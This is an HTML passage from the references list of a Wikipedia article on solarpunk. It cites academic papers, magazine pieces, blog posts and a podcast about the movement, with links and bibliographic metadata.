<li id="cite_note-6"><span><b><a href="#cite_ref-6">^</a></b></span> <span><cite id="CITEREFGillam2023">Gillam, William Joseph (2023). <a rel="nofollow" href="https://doi.org/10.3390%2Fphilosophies8040073">"A Solarpunk Manifesto: Turning Imaginary into Reality"</a>. <i><a href="https://en.wikipedia.org/wiki/Philosophies_(journal)" title="Philosophies (journal)">Philosophies</a></i>. <b>8</b> (4): 73. <a href="https://en.wikipedia.org/wiki/Doi_(identifier)" title="Doi (identifier)">doi</a>:<span title="Freely accessible"><a rel="nofollow" href="https://doi.org/10.3390%2Fphilosophies8040073">10.3390/philosophies8040073</a></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Philosophies&amp;rft.atitle=A+Solarpunk+Manifesto%3A+Turning+Imaginary+into+Reality&amp;rft.volume=8&amp;rft.issue=4&amp;rft.pages=73&amp;rft.date=2023&amp;rft_id=info%3Adoi%2F10.3390%2Fphilosophies8040073&amp;rft.aulast=Gillam&amp;rft.aufirst=William+Joseph&amp;rft_id=https%3A%2F%2Fdoi.org%2F10.3390%252Fphilosophies8040073&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-Johnson2-7"><span>^ <a href="#cite_ref-Johnson2_7-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-Johnson2_7-1"><sup><i><b>b</b></i></sup></a></span> <span><cite id="CITEREFJohnson2020">Johnson, Isaijah (May 2020). <a rel="nofollow" href="http://www.susted.com/wordpress/content/solarpunk-the-pedagogical-value-of-utopia_2020_05/">"<span></span>"Solarpunk" &amp; the Pedagogical Value of Utopia"</a>. <i>Journal of Sustainability Education</i>. <b>23</b>. <q><span></span>"Solar" is itself a reference to solar energy, from photovoltaic cells to passive heating—clean, sustainable, renewable energies with minimal carbon footprint. In the darkness of climate anxiety, solarpunk is a beam of hope showing the way toward a livable future.</q></cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+Sustainability+Education&amp;rft.atitle=%22Solarpunk%22+%26+the+Pedagogical+Value+of+Utopia&amp;rft.volume=23&amp;rft.date=2020-05&amp;rft.aulast=Johnson&amp;rft.aufirst=Isaijah&amp;rft_id=http%3A%2F%2Fwww.susted.com%2Fwordpress%2Fcontent%2Fsolarpunk-the-pedagogical-value-of-utopia_2020_05%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-8"><span><b><a href="#cite_ref-8">^</a></b></span> <span><cite id="CITEREFReina-Rozo2021">Reina-Rozo, Juan David (2021-03-05). <a rel="nofollow" href="https://ojs.library.queensu.ca/index.php/IJESJP/article/view/14292">"Art, Energy and Technology: the Solarpunk Movement"</a>. <i>International Journal of Engineering, Social Justice, and Peace</i>. <b>8</b> (1): <span>47–</span>60. <a href="https://en.wikipedia.org/wiki/Doi_(identifier)" title="Doi (identifier)">doi</a>:<span title="Freely accessible"><a rel="nofollow" href="https://doi.org/10.24908%2Fijesjp.v8i1.14292">10.24908/ijesjp.v8i1.14292</a></span>. <a href="https://en.wikipedia.org/wiki/ISSN_(identifier)" title="ISSN (identifier)">ISSN</a>&nbsp;<a rel="nofollow" href="https://search.worldcat.org/issn/1927-9434">1927-9434</a>. <a href="https://en.wikipedia.org/wiki/S2CID_(identifier)" title="S2CID (identifier)">S2CID</a>&nbsp;<a rel="nofollow" href="https://api.semanticscholar.org/CorpusID:233805052">233805052</a>. <q>The 'punk' in Solarpunk is about rebellion, counterculture, post-capitalism, decolonialism and enthusiasm. It is about going in a different direction than the mainstream, which is increasingly going in a scary direction.</q></cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=International+Journal+of+Engineering%2C+Social+Justice%2C+and+Peace&amp;rft.atitle=Art%2C+Energy+and+Technology%3A+the+Solarpunk+Movement&amp;rft.volume=8&amp;rft.issue=1&amp;rft.pages=%3Cspan+class%3D%22nowrap%22%3E47-%3C%2Fspan%3E60&amp;rft.date=2021-03-05&amp;rft_id=https%3A%2F%2Fapi.semanticscholar.org%2FCorpusID%3A233805052%23id-name%3DS2CID&amp;rft.issn=1927-9434&amp;rft_id=info%3Adoi%2F10.24908%2Fijesjp.v8i1.14292&amp;rft.aulast=Reina-Rozo&amp;rft.aufirst=Juan+David&amp;rft_id=https%3A%2F%2Fojs.library.queensu.ca%2Findex.php%2FIJESJP%2Farticle%2Fview%2F14292&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-9"><span><b><a href="#cite_ref-9">^</a></b></span> <span>Reina-Rozo, J. D. (2021). Art, Energy and Technology: the Solarpunk Movement. International Journal of Engineering, Social Justice, and Peace, 8(1), 47–60. <a rel="nofollow" href="https://doi.org/10.24908/ijesjp.v8i1.14292">https://doi.org/10.24908/ijesjp.v8i1.14292</a></span>
</li>
<li id="cite_note-10"><span><b><a href="#cite_ref-10">^</a></b></span> <span>Wilson, Elizabeth. "Bohemian dress and the heroism of everyday life." Fashion Theory 2.3 (1998): 225-244.</span>
</li>
<li id="cite_note-11"><span><b><a href="#cite_ref-11">^</a></b></span> <span><cite><a rel="nofollow" href="https://republicofthebees.blogspot.com/2008/04/from-steampunk-to-solarpunk.html">"From Steampunk to Solarpunk"</a>. Republic of the Bees. April 30, 2008.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=From+Steampunk+to+Solarpunk&amp;rft.pub=Republic+of+the+Bees&amp;rft.date=2008-04-30&amp;rft_id=https%3A%2F%2Frepublicofthebees.blogspot.com%2F2008%2F04%2Ffrom-steampunk-to-solarpunk.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-Williams-12"><span>^ <a href="#cite_ref-Williams_12-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-Williams_12-1"><sup><i><b>b</b></i></sup></a></span> <span><cite id="CITEREFWilliams2019">Williams, Rhys (September 2019). <a rel="nofollow" href="https://doi.org/10.16995%2Folh.329">"<span>'</span>This Shining Confluence of Magic and Technology': Solarpunk, Energy Imaginaries, and the Infrastructures of Solarity"</a>. <i><a href="https://en.wikipedia.org/wiki/Open_Library_of_Humanities" title="Open Library of Humanities">Open Library of Humanities</a></i>. <b>5</b> (1): <span>1–</span>35. <a href="https://en.wikipedia.org/wiki/Doi_(identifier)" title="Doi (identifier)">doi</a>:<span title="Freely accessible"><a rel="nofollow" href="https://doi.org/10.16995%2Folh.329">10.16995/olh.329</a></span>. <a href="https://en.wikipedia.org/wiki/S2CID_(identifier)" title="S2CID (identifier)">S2CID</a>&nbsp;<a rel="nofollow" href="https://api.semanticscholar.org/CorpusID:194629261">194629261</a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Open+Library+of+Humanities&amp;rft.atitle=%3Cspan+style%3D%22padding-left%3A0.15em%3B%22%3E%26%2339%3B%3C%2Fspan%3EThis+Shining+Confluence+of+Magic+and+Technology%27%3A+Solarpunk%2C+Energy+Imaginaries%2C+and+the+Infrastructures+of+Solarity&amp;rft.volume=5&amp;rft.issue=1&amp;rft.pages=%3Cspan+class%3D%22nowrap%22%3E1-%3C%2Fspan%3E35&amp;rft.date=2019-09&amp;rft_id=info%3Adoi%2F10.16995%2Folh.329&amp;rft_id=https%3A%2F%2Fapi.semanticscholar.org%2FCorpusID%3A194629261%23id-name%3DS2CID&amp;rft.aulast=Williams&amp;rft.aufirst=Rhys&amp;rft_id=https%3A%2F%2Fdoi.org%2F10.16995%252Folh.329&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-13"><span><b><a href="#cite_ref-13">^</a></b></span> <span><cite id="CITEREFDavis2009">Davis, Lauren (2009-08-19). <a rel="nofollow" href="https://gizmodo.com/could-greenpunk-be-the-new-steampunk-5340958">"Could Greenpunk be the New Steampunk?"</a>. <i><a href="https://en.wikipedia.org/wiki/Gizmodo" title="Gizmodo">Gizmodo</a></i>. <a rel="nofollow" href="https://web.archive.org/web/20210704132842/https://gizmodo.com/could-greenpunk-be-the-new-steampunk-5340958">Archived</a> from the original on 2021-07-04.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Gizmodo&amp;rft.atitle=Could+Greenpunk+be+the+New+Steampunk%3F&amp;rft.date=2009-08-19&amp;rft.aulast=Davis&amp;rft.aufirst=Lauren&amp;rft_id=https%3A%2F%2Fgizmodo.com%2Fcould-greenpunk-be-the-new-steampunk-5340958&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-14"><span><b><a href="#cite_ref-14">^</a></b></span> <span><cite id="CITEREFHageman2012">Hageman, Andrew (July 2012). "The Challenge of Imagining Ecological Futures: Paolo Bacigalupi's The Windup Girl". <i><a href="https://en.wikipedia.org/wiki/Science_Fiction_Studies" title="Science Fiction Studies">Science Fiction Studies</a></i>. <b>39</b> (2): 301. <a href="https://en.wikipedia.org/wiki/Doi_(identifier)" title="Doi (identifier)">doi</a>:<a rel="nofollow" href="https://doi.org/10.5621%2Fsciefictstud.39.2.0283">10.5621/sciefictstud.39.2.0283</a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science+Fiction+Studies&amp;rft.atitle=The+Challenge+of+Imagining+Ecological+Futures%3A+Paolo+Bacigalupi%27s+The+Windup+Girl&amp;rft.volume=39&amp;rft.issue=2&amp;rft.pages=301&amp;rft.date=2012-07&amp;rft_id=info%3Adoi%2F10.5621%2Fsciefictstud.39.2.0283&amp;rft.aulast=Hageman&amp;rft.aufirst=Andrew&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-15"><span><b><a href="#cite_ref-15">^</a></b></span> <span><cite id="CITEREFLouise2014">Louise, Olivia (2014). <a rel="nofollow" href="https://missolivialouise.tumblr.com/post/94374063675/heres-a-thing-ive-had-around-in-my-head-for-a">"Land of Masks and Jewels - Here's a thing I've had around in my head for a..."</a> <i>Land of Masks and Jewels</i>. <a rel="nofollow" href="https://web.archive.org/web/20141123135235/http://missolivialouise.tumblr.com/post/94374063675/heres-a-thing-ive-had-around-in-my-head-for-a">Archived</a> from the original on 2014-11-23.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Land+of+Masks+and+Jewels&amp;rft.atitle=Land+of+Masks+and+Jewels+-+Here%27s+a+thing+I%27ve+had+around+in+my+head+for+a...&amp;rft.date=2014&amp;rft.aulast=Louise&amp;rft.aufirst=Olivia&amp;rft_id=https%3A%2F%2Fmissolivialouise.tumblr.com%2Fpost%2F94374063675%2Fheres-a-thing-ive-had-around-in-my-head-for-a&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-16"><span><b><a href="#cite_ref-16">^</a></b></span> <span><cite id="CITEREFFlynn2014">Flynn, Adam (2014-09-04). <a rel="nofollow" href="https://hieroglyph.asu.edu/2014/09/solarpunk-notes-toward-a-manifesto/">"Solarpunk: Notes toward a manifesto"</a>. <i>hieroglyph.asu.edu</i>. Project Hieroglyph. <a rel="nofollow" href="https://web.archive.org/web/20150628114055/http://hieroglyph.asu.edu/2014/09/solarpunk-notes-toward-a-manifesto/">Archived</a> from the original on 2015-06-28.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=hieroglyph.asu.edu&amp;rft.atitle=Solarpunk%3A+Notes+toward+a+manifesto&amp;rft.date=2014-09-04&amp;rft.aulast=Flynn&amp;rft.aufirst=Adam&amp;rft_id=https%3A%2F%2Fhieroglyph.asu.edu%2F2014%2F09%2Fsolarpunk-notes-toward-a-manifesto%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-grist-17"><span><b><a href="#cite_ref-grist_17-0">^</a></b></span> <span><cite id="CITEREFJacobs2015">Jacobs, Suzanne (2015-11-10). <a rel="nofollow" href="https://grist.org/business-technology/this-sci-fi-enthusiast-wants-to-make-solarpunk-happen/">"This sci-fi enthusiast wants to make "solarpunk" happen"</a>. <i>Grist</i>. <a rel="nofollow" href="https://web.archive.org/web/20151111033907/http://grist.org/business-technology/this-sci-fi-enthusiast-wants-to-make-solarpunk-happen/">Archived</a> from the original on 2015-11-11.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Grist&amp;rft.atitle=This+sci-fi+enthusiast+wants+to+make+%22solarpunk%22+happen&amp;rft.date=2015-11-10&amp;rft.aulast=Jacobs&amp;rft.aufirst=Suzanne&amp;rft_id=https%3A%2F%2Fgrist.org%2Fbusiness-technology%2Fthis-sci-fi-enthusiast-wants-to-make-solarpunk-happen%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-18"><span><b><a href="#cite_ref-18">^</a></b></span> <span><cite><a rel="nofollow" href="http://www.re-des.org/a-solarpunk-manifesto/">"A Solarpunk Manifesto"</a>. <i>re-des.org</i>. Regenerative Design. <a rel="nofollow" href="https://web.archive.org/web/20191012233135/http://www.re-des.org/a-solarpunk-manifesto/">Archived</a> from the original on 2019-10-12<span>. Retrieved <span>2021-07-04</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=re-des.org&amp;rft.atitle=A+Solarpunk+Manifesto&amp;rft_id=http%3A%2F%2Fwww.re-des.org%2Fa-solarpunk-manifesto%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-sf-encyclopedia-19"><span><b><a href="#cite_ref-sf-encyclopedia_19-0">^</a></b></span> <span><cite id="CITEREFMachell2024">Machell, James (2024-08-05). <a rel="nofollow" href="https://sf-encyclopedia.com/entry/solarpunk">"Solarpunk"</a>. In <a href="https://en.wikipedia.org/wiki/John_Clute" title="John Clute">Clute, John</a>; <a href="https://en.wikipedia.org/wiki/David_Langford" title="David Langford">Langford, David</a> (eds.). <a rel="nofollow" href="https://sf-encyclopedia.com/"><i>The Encyclopedia of Science Fiction</i></a>. Reading: Ansible Editions<span>. Retrieved <span>2024-08-17</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Solarpunk&amp;rft.btitle=The+Encyclopedia+of+Science+Fiction&amp;rft.place=Reading&amp;rft.pub=Ansible+Editions&amp;rft.date=2024-08-05&amp;rft.aulast=Machell&amp;rft.aufirst=James&amp;rft_id=https%3A%2F%2Fsf-encyclopedia.com%2Fentry%2Fsolarpunk&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-20"><span><b><a href="#cite_ref-20">^</a></b></span> <span><cite id="CITEREFHamilton2017">Hamilton, Jennifer (July 19, 2017). <a rel="nofollow" href="https://theconversation.com/explainer-solarpunk-or-how-to-be-an-optimistic-radical-80275">"Explainer: 'solarpunk', or how to be an optimistic radical"</a>. <i>The Conversation</i>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=The+Conversation&amp;rft.atitle=Explainer%3A+%27solarpunk%27%2C+or+how+to+be+an+optimistic+radical&amp;rft.date=2017-07-19&amp;rft.aulast=Hamilton&amp;rft.aufirst=Jennifer&amp;rft_id=https%3A%2F%2Ftheconversation.com%2Fexplainer-solarpunk-or-how-to-be-an-optimistic-radical-80275&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-rewire-21"><span><b><a href="#cite_ref-rewire_21-0">^</a></b></span> <span><cite id="CITEREFPeskoe-Yang2018">Peskoe-Yang, Lynne (23 November 2018). <a rel="nofollow" href="https://www.rewire.org/our-future/learn-solarpunk-movement/">"What You Can Learn From the Solarpunk Movement"</a>. <i>Rewire</i><span>. Retrieved <span>7 May</span> 2019</span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Rewire&amp;rft.atitle=What+You+Can+Learn+From+the+Solarpunk+Movement&amp;rft.date=2018-11-23&amp;rft.aulast=Peskoe-Yang&amp;rft.aufirst=Lynne&amp;rft_id=https%3A%2F%2Fwww.rewire.org%2Four-future%2Flearn-solarpunk-movement%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-22"><span><b><a href="#cite_ref-22">^</a></b></span> <span><cite id="CITEREFStępień">Stępień, Katarzyna. <a rel="nofollow" href="http://www.currents.umk.pl/files/issues/7/stepien-future.pdf">"<span></span>"THE FUTURE'S [NOT] OURS TO SEE"—VISIONS OF FORTHCOMING HUMANITY IN SOLARPUNK"</a> <span>(PDF)</span>. <i>CURRENTS. A Journal of Young English Philology Thought and Review</i><span>. Retrieved <span>9 September</span> 2022</span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=CURRENTS.+A+Journal+of+Young+English+Philology+Thought+and+Review&amp;rft.atitle=%22THE+FUTURE%27S+%5BNOT%5D+OURS+TO+SEE%22%E2%80%94VISIONS+OF+FORTHCOMING+HUMANITY+IN+SOLARPUNK&amp;rft.aulast=St%C4%99pie%C5%84&amp;rft.aufirst=Katarzyna&amp;rft_id=http%3A%2F%2Fwww.currents.umk.pl%2Ffiles%2Fissues%2F7%2Fstepien-future.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-23"><span><b><a href="#cite_ref-23">^</a></b></span> <span><cite><a rel="nofollow" href="https://podcast.tomasino.org/@SolarpunkPrompts/episodes/the-community-center">"The Community Center episode of the Solarpunk Prompts podcast"</a>. <i>Solarpunk Prompts podcast</i>. 2 November 2022<span>. Retrieved <span>23 August</span> 2024</span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Solarpunk+Prompts+podcast&amp;rft.atitle=The+Community+Center+episode+of+the+Solarpunk+Prompts+podcast&amp;rft.date=2022-11-02&amp;rft_id=https%3A%2F%2Fpodcast.tomasino.org%2F%40SolarpunkPrompts%2Fepisodes%2Fthe-community-center&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-sciphijournal-24"><span>^ <a href="#cite_ref-sciphijournal_24-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-sciphijournal_24-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-sciphijournal_24-2"><sup><i><b>c</b></i></sup></a></span> <span><cite id="CITEREFHunting2021">Hunting, Eric (September 30, 2021). <a rel="nofollow" href="https://www.sciphijournal.org/index.php/2021/09/30/on-solarpunk/">"On Solarpunk"</a>. <i><a href="https://en.wikipedia.org/wiki/Sci_Phi_Journal" title="Sci Phi Journal">Sci Phi Journal</a></i>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Sci+Phi+Journal&amp;rft.atitle=On+Solarpunk&amp;rft.date=2021-09-30&amp;rft.aulast=Hunting&amp;rft.aufirst=Eric&amp;rft_id=https%3A%2F%2Fwww.sciphijournal.org%2Findex.php%2F2021%2F09%2F30%2Fon-solarpunk%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-Johnson-25"><span>^ <a href="#cite_ref-Johnson_25-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-Johnson_25-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-Johnson_25-2"><sup><i><b>c</b></i></sup></a> <a href="#cite_ref-Johnson_25-3"><sup><i><b>d</b></i></sup></a> <a href="#cite_ref-Johnson_25-4"><sup><i><b>e</b></i></sup></a></span> <span><cite id="CITEREFJohnson2020">Johnson, Isaijah (May 2020). <a rel="nofollow" href="http://www.susted.com/wordpress/content/solarpunk-the-pedagogical-value-of-utopia_2020_05/">"<span></span>"Solarpunk" &amp; the Pedagogical Value of Utopia"</a>. <i>Journal of Sustainability Education</i>. <b>23</b>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+Sustainability+Education&amp;rft.atitle=%22Solarpunk%22+%26+the+Pedagogical+Value+of+Utopia&amp;rft.volume=23&amp;rft.date=2020-05&amp;rft.aulast=Johnson&amp;rft.aufirst=Isaijah&amp;rft_id=http%3A%2F%2Fwww.susted.com%2Fwordpress%2Fcontent%2Fsolarpunk-the-pedagogical-value-of-utopia_2020_05%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-singularity-26"><span>^ <a href="#cite_ref-singularity_26-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-singularity_26-1"><sup><i><b>b</b></i></sup></a></span> <span><cite id="CITEREFIsmLeyre2020">Ism, Carin; Leyre, Julien (2020-09-06). <a rel="nofollow" href="https://singularityhub.com/2020/09/06/solarpunk-is-growing-a-gorgeous-new-world-in-the-cracks-of-the-old-one/">"Solarpunk Is Growing a Gorgeous New World in the Cracks of the Old One"</a>. <i>Singularity Hub</i>. <a rel="nofollow" href="https://web.archive.org/web/20200906190805/https://singularityhub.com/2020/09/06/solarpunk-is-growing-a-gorgeous-new-world-in-the-cracks-of-the-old-one/">Archived</a> from the original on 2020-09-06<span>. Retrieved <span>2021-08-18</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Singularity+Hub&amp;rft.atitle=Solarpunk+Is+Growing+a+Gorgeous+New+World+in+the+Cracks+of+the+Old+One&amp;rft.date=2020-09-06&amp;rft.aulast=Ism&amp;rft.aufirst=Carin&amp;rft.au=Leyre%2C+Julien&amp;rft_id=https%3A%2F%2Fsingularityhub.com%2F2020%2F09%2F06%2Fsolarpunk-is-growing-a-gorgeous-new-world-in-the-cracks-of-the-old-one%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-longreads-27"><span><b><a href="#cite_ref-longreads_27-0">^</a></b></span> <span><cite id="CITEREFBoffa2018">Boffa, Adam (12 December 2018). <a rel="nofollow" href="https://longreads.com/2018/12/12/solarpunk-review/">"At the Very Least We Know the End of the World Will Have a Bright Side"</a>. <i>Longreads</i><span>. Retrieved <span>7 May</span> 2019</span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Longreads&amp;rft.atitle=At+the+Very+Least+We+Know+the+End+of+the+World+Will+Have+a+Bright+Side&amp;rft.date=2018-12-12&amp;rft.aulast=Boffa&amp;rft.aufirst=Adam&amp;rft_id=https%3A%2F%2Flongreads.com%2F2018%2F12%2F12%2Fsolarpunk-review%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-28"><span><b><a href="#cite_ref-28">^</a></b></span> <span><cite id="CITEREFReina-Rozo2021">Reina-Rozo, Juan David (2021-03-05). <a rel="nofollow" href="https://ojs.library.queensu.ca/index.php/IJESJP/article/view/14292">"Art, Energy and Technology: the Solarpunk Movement"</a>. <i>International Journal of Engineering, Social Justice, and Peace</i>. <b>8</b> (1): <span>47–</span>60. <a href="https://en.wikipedia.org/wiki/Doi_(identifier)" title="Doi (identifier)">doi</a>:<span title="Freely accessible"><a rel="nofollow" href="https://doi.org/10.24908%2Fijesjp.v8i1.14292">10.24908/ijesjp.v8i1.14292</a></span>. <a href="https://en.wikipedia.org/wiki/ISSN_(identifier)" title="ISSN (identifier)">ISSN</a>&nbsp;<a rel="nofollow" href="https://search.worldcat.org/issn/1927-9434">1927-9434</a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=International+Journal+of+Engineering%2C+Social+Justice%2C+and+Peace&amp;rft.atitle=Art%2C+Energy+and+Technology%3A+the+Solarpunk+Movement&amp;rft.volume=8&amp;rft.issue=1&amp;rft.pages=%3Cspan+class%3D%22nowrap%22%3E47-%3C%2Fspan%3E60&amp;rft.date=2021-03-05&amp;rft_id=info%3Adoi%2F10.24908%2Fijesjp.v8i1.14292&amp;rft.issn=1927-9434&amp;rft.aulast=Reina-Rozo&amp;rft.aufirst=Juan+David&amp;rft_id=https%3A%2F%2Fojs.library.queensu.ca%2Findex.php%2FIJESJP%2Farticle%2Fview%2F14292&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-29"><span><b><a href="#cite_ref-29">^</a></b></span> <span><cite><a rel="nofollow" href="https://solarpunkstation.com/2018/07/12/solarpunk-a-decentralized-society/">"Solarpunk: A decentralized society"</a>. 12 July 2018.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Solarpunk%3A+A+decentralized+society&amp;rft.date=2018-07-12&amp;rft_id=https%3A%2F%2Fsolarpunkstation.com%2F2018%2F07%2F12%2Fsolarpunk-a-decentralized-society%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-30"><span><b><a href="#cite_ref-30">^</a></b></span> <span><cite><a rel="nofollow" href="https://www.mercurynews.com/2024/12/24/solarpunk-environmental-movement-bay-area/">"What is solarpunk? Inside an audaciously hopeful environmental movement that's thriving in the Bay Area"</a>. <i>The Mercury News</i>. 2024-12-24<span>. Retrieved <span>2024-12-28</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=The+Mercury+News&amp;rft.atitle=What+is+solarpunk%3F+Inside+an+audaciously+hopeful+environmental+movement+that%27s+thriving+in+the+Bay+Area&amp;rft.date=2024-12-24&amp;rft_id=https%3A%2F%2Fwww.mercurynews.com%2F2024%2F12%2F24%2Fsolarpunk-environmental-movement-bay-area%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-leguin-31"><span>^ <a href="#cite_ref-leguin_31-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-leguin_31-1"><sup><i><b>b</b></i></sup></a></span> <span><cite><a rel="nofollow" href="https://www.susted.com/wordpress/content/solarpunk-the-pedagogical-value-of-utopia_2020_05/">"<span></span>"Solarpunk" &amp; the Pedagogical Value of Utopia"</a>. <i>Journal of Sustainability Education</i>. 2020-05-01<span>. Retrieved <span>2024-12-25</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+Sustainability+Education&amp;rft.atitle=%22Solarpunk%22+%26+the+Pedagogical+Value+of+Utopia&amp;rft.date=2020-05-01&amp;rft_id=https%3A%2F%2Fwww.susted.com%2Fwordpress%2Fcontent%2Fsolarpunk-the-pedagogical-value-of-utopia_2020_05%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
